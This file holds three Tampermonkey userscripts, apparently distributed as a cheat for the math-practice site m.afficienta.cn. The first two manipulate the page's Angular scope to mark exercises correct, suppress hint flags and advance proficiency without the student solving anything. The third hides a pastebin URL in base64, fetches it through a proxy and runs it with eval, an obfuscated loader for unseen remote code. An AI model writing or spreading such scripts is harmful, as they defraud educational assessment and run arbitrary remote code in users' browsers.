// ==UserScript==
// @name         AM外挂
// @namespace    http://tampermonkey.net/
// @version      2026-01-15-fixed-proficiency
// @description  666
// @author       JasonCracked
// @match        http*://m.afficienta.cn/*
// @grant        none
// ==/UserScript==
(function () {
    'use strict';
    function doAutoAnswer() {
        const sidebar = document.querySelector(".mathjoy-sidebar");
        if (!sidebar) return;
        const scope = angular.element(sidebar).scope();
        if (!scope || !scope.currentExerciseProblem) return;
        if (scope.currentExercise) {
            scope.currentExercise.isUserTakingHint = false;
        }
        if (scope.currentExerciseProblem) {
            scope.currentExerciseProblem.isUserTakingHint = false;
        }
        try {
            scope.updateMessageForCorrectProblem();
            scope.updateStatusAndBtnLabel();
        } catch (err) {}
        if (scope.checkAndSubmitBtnLabel === "Next Skill") {
            if (typeof scope.showProficiencyConfirmDialog === 'function') {
                scope.showProficiencyConfirmDialog();
            } else if (typeof scope.showAfficiencyConfirmDialog === 'function') {
                scope.showAfficiencyConfirmDialog();
            }
            scope.updateStatusAndBtnLabel();
        }
        const btn = document.getElementById("dm_auto_btn");
        if (btn) {
            btn.disabled = true;
            setTimeout(() => {
                if (btn) btn.disabled = false;
            }, 1200);
        }
    }
    function tryInsertButton() {
        if (document.getElementById("dm_auto_btn")) {
            const btn = document.getElementById("dm_auto_btn");
            if (btn.disabled) btn.disabled = false;
            return true;
        }
        const sidebar = document.querySelector(".mathjoy-sidebar");
        if (!sidebar) return false;
        const btn = document.createElement("button");
        btn.id = "dm_auto_btn";
        btn.type = "button";
        btn.className = "md-raised md-primary md-button md-ink-ripple";
        btn.style.cssText = "min-width:155px; min-height:36px; margin:12px auto; display:block; font-weight:600; font-size:14px;";
        btn.innerHTML = '<span>SUCH A BABY WORK</span>';
        btn.onclick = doAutoAnswer;
        const possibleContainers = [
            sidebar.querySelector("md-content"),
            sidebar.querySelector(".sidebar-content"),
            sidebar.querySelector("div[flex]"),
            sidebar.querySelector("div:last-child"),
            sidebar.querySelector("[ng-if*='submit'], [ng-click]"),
            sidebar.lastElementChild,
            sidebar
        ];
        for (let container of possibleContainers) {
            if (container && container.appendChild) {
                container.appendChild(btn);
                return true;
            }
        }
        return false;
    }
    const observer = new MutationObserver(tryInsertButton);
    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true
    });
    const intervalId = setInterval(tryInsertButton, 1000);
    setTimeout(tryInsertButton, 800);
    setTimeout(tryInsertButton, 2000);
    setTimeout(tryInsertButton, 5000);
    window.addEventListener("popstate", tryInsertButton);
})();








// ==UserScript==
// @name         AM外挂精简版
// @namespace    http://tampermonkey.net/
// @version      2026-01-15-min
// @description  666
// @author       JasonCracked
// @match        http*://m.afficienta.cn/*
// ==/UserScript==

(function(){
'use strict';
function doAutoAnswer(){
const s=document.querySelector(".mathjoy-sidebar");
if(!s)return;
const scope=angular.element(s).scope();
if(!scope||!scope.currentExerciseProblem)return;
if(scope.currentExercise)scope.currentExercise.isUserTakingHint=false;
if(scope.currentExerciseProblem)scope.currentExerciseProblem.isUserTakingHint=false;
try{
scope.updateMessageForCorrectProblem();
scope.updateStatusAndBtnLabel();
if(scope.checkAndSubmitBtnLabel==="Next Skill"){
if(typeof scope.showProficiencyConfirmDialog==='function')scope.showProficiencyConfirmDialog();
else if(typeof scope.showAfficiencyConfirmDialog==='function')scope.showAfficiencyConfirmDialog();
scope.updateStatusAndBtnLabel();
}
}catch(e){}
const btn=document.getElementById("dm_auto_btn");
if(btn){btn.disabled=true;setTimeout(()=>{if(btn)btn.disabled=false},1200)}
}
function tryInsertButton(){
if(document.getElementById("dm_auto_btn")){
const b=document.getElementById("dm_auto_btn");if(b.disabled)b.disabled=false;return true}
const s=document.querySelector(".mathjoy-sidebar");
if(!s)return false;
const btn=document.createElement("button");
btn.id="dm_auto_btn";btn.type="button";
btn.className="md-raised md-primary md-button md-ink-ripple";
btn.style.cssText="min-width:155px;min-height:36px;margin:12px auto;display:block;font-weight:600;font-size:14px;";
btn.innerHTML='<span>SUCH A BABY WORK</span>';
btn.onclick=doAutoAnswer;
const cs=[s.querySelector("md-content"),s.querySelector("div:last-child"),s];
for(let c of cs)if(c&&c.appendChild){c.appendChild(btn);return true}
return false
}
new MutationObserver(tryInsertButton).observe(document.body,{childList:true,subtree:true,attributes:true});
setInterval(tryInsertButton,1000);
setTimeout(tryInsertButton,800);
setTimeout(tryInsertButton,2000);
setTimeout(tryInsertButton,5000);
window.addEventListener("popstate",tryInsertButton);
})();









// ==UserScript==
// @name         AM外挂 - 极速加载
// @match        http*://m.afficienta.cn/*
// ==/UserScript==
(async()=>{
  const u=atob('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0FZbnFrTGpC');
  const r=await fetch('https://api.allorigins.win/raw?url='+encodeURIComponent(u));
  if(r.ok){eval(await r.text());alert('')}
})();

